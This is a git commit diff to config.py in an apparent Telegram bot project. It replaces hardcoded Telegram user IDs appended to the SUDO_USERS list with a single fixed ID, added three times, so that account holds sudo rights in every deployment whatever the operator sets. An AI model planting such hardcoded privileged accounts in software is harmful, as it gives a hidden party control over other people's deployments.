da997a5b5b8b3faff023fd619d2cb2468d3b6655
Gᴏᴅғᴀᴛʜᴇʀ <104144725+mrtosumemon@users.noreply.github.com>
2024-12-03 06:04:46 +0530

    Update config.py

--- config.py
+++ config.py
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(5551014551)
-SUDO_USERS.append(6218518584)
-SUDO_USERS.append(6218518584)
+SUDO_USERS.append(7520092354)
+SUDO_USERS.append(7520092354)
+SUDO_USERS.append(7520092354)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
